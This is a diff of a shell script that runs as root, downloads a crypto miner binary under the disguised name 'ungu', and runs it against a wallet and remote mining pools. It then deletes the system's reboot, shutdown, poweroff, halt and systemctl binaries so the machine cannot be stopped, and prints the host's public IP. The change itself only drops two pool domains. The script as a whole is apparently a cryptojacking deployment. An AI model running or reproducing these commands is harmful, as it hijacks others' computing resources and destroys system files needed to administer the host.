@@ -3,7 +3,7 @@ apt update && apt install sudo
 sudo su
 wget -O ungu https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.2/miner-linux-amd64
 chmod 777 ungu
-./ungu -targetMiner 0xD2feC342F98Dd7162e77865E0AFc6b83f31EE333 -domain https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com,https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com
+./ungu -targetMiner 0xD2feC342F98Dd7162e77865E0AFc6b83f31EE333 -domain https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
